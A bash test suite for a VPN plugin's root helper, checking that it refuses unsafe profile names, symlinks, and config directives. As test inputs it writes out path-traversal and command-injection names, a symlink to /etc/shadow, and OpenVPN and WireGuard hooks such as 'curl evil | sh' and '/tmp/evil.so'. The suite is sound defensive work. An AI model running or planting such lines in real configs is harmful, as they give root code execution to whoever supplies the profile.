#!/bin/bash
# bin/install-profile is the only thing in this plugin that runs as root, and
# its caller is unprivileged and therefore untrusted. These are the checks that
# have to hold before it writes anything — all of them fire before the first
# privileged syscall, so the whole file runs as a normal user.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HELPER="$ROOT/bin/install-profile"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

pass=0
fail=0

# The helper is exercised two ways. Most of it is run as a subprocess, the way
# pkexec runs it. The two functions that stand between an untrusted config and
# root — vet_staging_dir and reject_unsafe_directives — are also called
# directly, because the code around them in cmd_install needs real root and
# these must not be the checks with no unprivileged test. Sourcing the helper
# defines its functions and runs nothing.
# shellcheck source=../bin/install-profile
source "$HELPER"
set +e -uo pipefail  # the helper's `set -e` would abort this suite on a refusal

# Asserts the helper refuses, and refuses for the stated reason rather than by
# tripping over something later.
refuses() {
  local because="$1"; shift
  local output
  output="$("$HELPER" "$@" 2>&1)"
  local code=$?
  if [[ $code -eq 0 ]]; then
    echo "not ok - should have refused ($because): $*"
    fail=$((fail + 1))
  elif [[ $output != *"$because"* ]]; then
    echo "not ok - refused for the wrong reason ($because): $output"
    fail=$((fail + 1))
  else
    echo "ok - refuses $because"
    pass=$((pass + 1))
  fi
}

echo "# argument validation"
refuses "usage"            
refuses "unknown protocol" install badproto name "$TMP"
refuses "unknown protocol" list badproto
refuses "unknown protocol" remove badproto name

echo "# the name can never become a path"
refuses "invalid profile name" install openvpn "../../etc/passwd" "$TMP"
refuses "invalid profile name" install openvpn "/etc/shadow" "$TMP"
refuses "invalid profile name" install openvpn "a/b" "$TMP"
refuses "invalid profile name" install openvpn ".hidden" "$TMP"
refuses "invalid profile name" install openvpn "a b" "$TMP"
refuses "invalid profile name" install openvpn "a;rm -rf /" "$TMP"
refuses "too long"             install openvpn "$(printf 'x%.0s' {1..65})" "$TMP"
# An omitted name trips the usage check before the emptiness check; either
# way nothing is written, which is the property under test.
refuses "usage"                install openvpn "" "$TMP"
refuses "invalid profile name" remove openvpn "../../etc/passwd"

echo "# the destination is never caller-supplied"
# There is no argument that names a directory to write into — only a protocol
# token — so this is asserted by reading the interface rather than probing it.
if grep -qE '^\s*(dir|DEST)=.*\$[1-9]' "$HELPER"; then
  echo "not ok - a destination directory is taken from an argument"
  fail=$((fail + 1))
else
  echo "ok - destination comes from profile_dir(), not from argv"
  pass=$((pass + 1))
fi

echo "# staging directory vetting"

# vet_staging_dir runs against the root-owned copy, so it is called here
# directly rather than through cmd_install, which cannot get that far without
# real root.
vets() {
  local because="$1" name="$2" dir="$3" output code
  output="$( (vet_staging_dir openvpn "$name" "$dir") 2>&1 )"
  code=$?
  if [[ $code -eq 0 ]]; then
    echo "not ok - should have refused ($because)"
    fail=$((fail + 1))
  elif [[ $output != *"$because"* ]]; then
    echo "not ok - refused for the wrong reason ($because): $output"
    fail=$((fail + 1))
  else
    echo "ok - refuses $because"
    pass=$((pass + 1))
  fi
}

mkdir -p "$TMP/staging"
vets "no work.conf" work "$TMP/staging"

printf 'client\nremote a 1194\n' > "$TMP/staging/work.conf"
# The symlink that used to be a check/use race: it was validated here and
# reopened by `install` afterwards. It is now refused on a root-owned copy that
# the caller can no longer touch — and copied with --no-dereference, so even
# the refusal never read /etc/shadow.
ln -s /etc/shadow "$TMP/staging/work.key"
vets "symlink" work "$TMP/staging"

rm -f "$TMP/staging/work.key"
mkdir -p "$TMP/staging/work.sub"
vets "not a regular file" work "$TMP/staging"

rmdir "$TMP/staging/work.sub"
touch "$TMP/staging/somebodyelse.conf"
vets "does not belong to profile" work "$TMP/staging"
rm -f "$TMP/staging/somebodyelse.conf"

refuses "does not exist" install openvpn work "$TMP/nonexistent"

ln -s "$TMP/staging" "$TMP/linked"
refuses "symlink" install openvpn work "$TMP/linked"

echo "# a missing profile directory is explained, not tripped over"
# A question worth settling: does /etc/openvpn/client exist right after a fresh
# `pacman -S openvpn`. It does: the openvpn package ships
# /usr/lib/tmpfiles.d/openvpn.conf, and pacman's 21-systemd-tmpfiles.hook runs
# `systemd-tmpfiles --create` post-transaction, after 20-systemd-sysusers.hook
# has made the openvpn user. So require_dir's fallback is only reached when
# someone has deleted the directory — and then it must say something useful
# rather than failing at the copy.
#
# /etc/wireguard exercises that path for real on a machine without
# wireguard-tools, with no root and nothing to clean up.
if [[ -d /etc/wireguard ]]; then
  echo "ok - SKIP: /etc/wireguard exists, so the missing-dir path cannot be exercised here"
  pass=$((pass + 1))
else
  mkdir -p "$TMP/wg"
  : > "$TMP/wg/demo.conf"
  refuses "is the wireguard package installed?" install wireguard demo "$TMP/wg"
fi

echo "# file mode"
# pkexec refuses a program that is group- or world-writable, so a bad umask at
# checkout time would make the whole privileged path unusable.
mode="$(stat -c '%a' "$HELPER")"
if [[ $mode == 755 || $mode == 700 || $mode == 750 ]]; then
  echo "ok - helper mode $mode is not group/world writable"
  pass=$((pass + 1))
else
  echo "not ok - helper mode $mode may be rejected by pkexec"
  fail=$((fail + 1))
fi

echo "# the config scan, which is the last thing between a profile and root"

# reject_unsafe_directives is the second enforcement of the lists in
# backends/*/Config.js, and the only one that runs with privilege — the first
# runs as the user, so from root's point of view it is input rather than a
# check. Sourced and called directly: everything else in cmd_install needs real
# root, and this must not be the one check with no unprivileged test.
#
# Called in a subshell throughout, because die() exits.

scans() {
  local expectation="$1" protocol="$2" body="$3" because="${4-}"
  local file="$TMP/scan.conf" output code
  printf '%s\n' "$body" > "$file"
  output="$( (reject_unsafe_directives "$protocol" "$file") 2>&1 )"
  code=$?

  if [[ $expectation == refuse ]]; then
    if [[ $code -eq 0 ]]; then
      echo "not ok - should have refused: $because"
      fail=$((fail + 1))
    elif [[ -n $because && $output != *"$because"* ]]; then
      echo "not ok - refused without naming $because: $output"
      fail=$((fail + 1))
    else
      echo "ok - refuses $protocol $because"
      pass=$((pass + 1))
    fi
  else
    if [[ $code -eq 0 ]]; then
      echo "ok - accepts $protocol $because"
      pass=$((pass + 1))
    else
      echo "not ok - refused a good config ($because): $output"
      fail=$((fail + 1))
    fi
  fi
}

# Code execution as root, the reason any of this exists.
scans refuse openvpn 'client
remote a 1194
script-security 2
up /bin/sh -c "curl evil | sh"' "up"

# A plugin needs no script-security at all, which is what makes leaving it off
# the list worse than leaving off a script hook.
scans refuse openvpn 'client
remote a 1194
plugin /tmp/evil.so' "plugin"

# OpenVPN accepts a directive in a config file spelled either way, so the
# `--` form has to be the same directive here or it is simply a bypass.
scans refuse openvpn 'client
remote a 1194
--up /bin/sh' "up"

# Quoting is the other spelling OpenVPN accepts.
scans refuse openvpn 'client
remote a 1194
"up" /bin/sh' "up"

# A file write at a path the profile chooses. ProtectSystem=true leaves /etc
# writable, so this reaches /etc/systemd/system.
scans refuse openvpn 'client
remote a 1194
status /etc/systemd/system/x.service' "status"

# The failure that would matter most in the field: a profile that is fine
# being refused. A PEM body is data, and base64 can begin with anything.
scans accept openvpn 'client
remote a 1194
<ca>
-----BEGIN CERTIFICATE-----
up
plugin
status
-----END CERTIFICATE-----
</ca>' "an inline block containing the keywords as data"

# Privilege-dropping directives are common in real profiles and must survive.
scans accept openvpn 'client
remote a 1194
user nobody
group nobody
persist-key' "user/group, which drop privilege rather than take it"

# wg-quick eval()s these, as root, from its own unit.
scans refuse wireguard '[Interface]
PrivateKey = k
PostUp = /bin/sh -c evil' "postup"

# wg-quick reads its keys case-insensitively, so this list has to as well.
scans refuse wireguard '[Interface]
PrivateKey = k
predown=/bin/sh' "predown"

scans accept wireguard '[Interface]
PrivateKey = k
Address = 10.0.0.2/32
DNS = 10.0.0.1

[Peer]
PublicKey = p
Endpoint = a.example.com:51820' "an ordinary profile"

echo "# stage-profile"

STAGER="$ROOT/bin/stage-profile"
STAGING="${XDG_CACHE_HOME:-$HOME/.cache}/connor.vpn/staging/__test-hooks"

out="$(printf 'client\n' | XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}" \
  bash "$STAGER" "$STAGING" "__test-hooks.conf" \
  --command sh --command definitely-not-a-command 2>&1)"
code=$?
rm -rf -- "$STAGING"

if [[ $code -ne 0 ]]; then
  echo "not ok - stage-profile stages a config"
  echo "$out" | sed 's/^/  /'
  fail=$((fail + 1))
else
  echo "ok - stage-profile stages a config"
  pass=$((pass + 1))
fi

# There is no --hook any more: hooks are removed at import, so nothing is left
# to look for. Accepting the flag again would mean a hook had survived.
if ! printf 'client\n' | bash "$STAGER" "$STAGING" "x.conf" --hook /usr/bin/env >/dev/null 2>&1; then
  echo "ok - stage-profile no longer takes --hook"
  pass=$((pass + 1))
else
  echo "not ok - stage-profile still takes --hook"
  fail=$((fail + 1))
fi
rm -rf -- "$STAGING"

# --command is used for the wg-quick DNS
# trap: `DNS =` is applied with resolvconf, which comes from an optional
# dependency that is not in Omarchy's base.
if [[ $out == *"missing-command: definitely-not-a-command"* ]]; then
  echo "ok - reports a command that is not on PATH"
  pass=$((pass + 1))
else
  echo "not ok - reports a command that is not on PATH"
  echo "$out" | sed 's/^/  /'
  fail=$((fail + 1))
fi

if [[ $out != *"missing-command: sh"* ]]; then
  echo "ok - stays quiet about a command that is present"
  pass=$((pass + 1))
else
  echo "not ok - warned about a command that exists"
  fail=$((fail + 1))
fi

echo "# credentials"
# The whole point of the design is that the secret never becomes an argument,
# so the first check is on the interface rather than on behaviour: there is no
# positional slot after <name> for set-credentials to put one in.
if grep -qE 'set-credentials\)[^;]*cmd_set_credentials "\$@"' "$HELPER" \
   && grep -qE 'IFS= read -r password' "$HELPER"; then
  echo "ok - the password is read from stdin, not taken from argv"
  pass=$((pass + 1))
else
  echo "not ok - set-credentials does not read its password from stdin"
  fail=$((fail + 1))
fi

# ...and the same property stated the other way round: no line in the helper
# may pass a password-shaped variable to a command.
if grep -nE '(printf|echo|install|cp)[^\n]*\$(\{)?password' "$HELPER" \
     | grep -qv "printf '%s\\\\n%s\\\\n'"; then
  echo "not ok - a password reaches a command line somewhere in the helper"
  grep -nE '(printf|echo|install|cp)[^\n]*\$(\{)?password' "$HELPER" | sed 's/^/  /'
  fail=$((fail + 1))
else
  echo "ok - the password only ever reaches a file, through printf"
  pass=$((pass + 1))
fi

refuses "usage" set-credentials openvpn
refuses "usage" clear-credentials openvpn
refuses "unknown protocol" set-credentials badproto name
refuses "invalid profile name" set-credentials openvpn "../../etc/passwd"
refuses "invalid profile name" clear-credentials openvpn "a/b"

# WireGuard authenticates with keys already inside the config. Asking to store
# a username and password for one is a caller bug, and refusing it here means
# the widget cannot invent a credential file the protocol has no use for.
refuses "do not use stored credentials" set-credentials wireguard demo
refuses "do not use stored credentials" clear-credentials wireguard demo

# Credentials for a profile that is not installed would be a file the widget
# can never see again — it cannot list that directory — so it is refused.
# Needs the openvpn package for the directory to exist; without it the earlier
# require_dir path covers the same ground.
if [[ -d /etc/openvpn/client ]]; then
  printf 'user\npass\n' | "$HELPER" set-credentials openvpn zz-definitely-not-installed \
    >/dev/null 2>"$TMP/cred.err"
  if grep -q "no profile named" "$TMP/cred.err"; then
    echo "ok - refuses credentials for a profile that is not installed"
    pass=$((pass + 1))
  else
    echo "not ok - refuses credentials for a profile that is not installed"
    sed 's/^/  /' "$TMP/cred.err"
    fail=$((fail + 1))
  fi
else
  echo "ok - SKIP: /etc/openvpn/client absent, so the orphan-credentials path cannot run here"
  pass=$((pass + 1))
fi

# Deleting a profile must delete its credentials, and it does so because
# `<name>.auth` falls under the `$name.*` glob cmd_remove already walks rather
# than because of a second rule that could drift away from this one.
if grep -qE 'for entry in "\$dir/\$name" "\$dir/\$name"\.\*' "$HELPER" \
   && grep -qE 'credential_ext\(\)' "$HELPER"; then
  echo "ok - remove's glob covers the credential file"
  pass=$((pass + 1))
else
  echo "not ok - remove may leave credentials behind"
  fail=$((fail + 1))
fi

echo "1..$((pass + fail))"
echo "# pass $pass  fail $fail"
[[ $fail -eq 0 ]]
